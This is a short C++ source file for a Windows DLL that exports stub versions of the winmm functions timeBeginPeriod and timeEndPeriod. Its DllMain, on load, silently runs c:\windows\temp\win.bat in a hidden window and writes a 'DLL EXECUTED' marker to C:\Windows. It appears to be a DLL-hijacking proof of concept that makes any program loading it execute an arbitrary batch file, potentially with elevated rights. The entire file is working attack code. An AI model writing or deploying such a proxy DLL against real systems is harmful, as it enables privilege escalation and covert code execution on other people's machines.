#include "stdafx.h"
#include <iostream>
#include <fstream>

#define EXTERN_DLL_EXPORT extern "C" __declspec(dllexport)

EXTERN_DLL_EXPORT UINT timeBeginPeriod(UINT uPeriod) {
	return 0;
}

EXTERN_DLL_EXPORT UINT timeEndPeriod(UINT uPeriod) {
	return 0;
}



BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {

	if (ul_reason_for_call == DLL_PROCESS_ATTACH) {
		WinExec("c:\\windows\\temp\\win.bat",SW_HIDE);
		std::ofstream file("C:\\Windows\\pippo.txt");
		file << "DLL EXECUTED" << std::endl;
	}

	return TRUE;

}